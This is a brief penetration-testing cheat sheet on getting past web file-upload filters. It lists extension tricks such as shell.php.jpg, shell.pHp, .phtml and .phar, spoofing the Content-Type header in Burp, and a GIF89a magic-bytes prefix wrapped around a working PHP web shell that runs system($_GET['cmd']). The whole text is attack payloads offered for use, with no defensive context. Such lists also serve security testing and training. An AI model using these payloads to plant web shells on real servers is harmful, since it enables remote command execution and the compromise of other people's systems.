## File Upload Bypass

```
# Extension bypass
shell.php.jpg
shell.pHp
shell.php5
shell.phtml
shell.phar

# MIME type bypass — change Content-Type in Burp
Content-Type: image/jpeg  (but upload PHP file)

# Magic bytes — prepend GIF header
GIF89a; <?php system($_GET['cmd']); ?>

# Double extension
shell.jpg.php
```

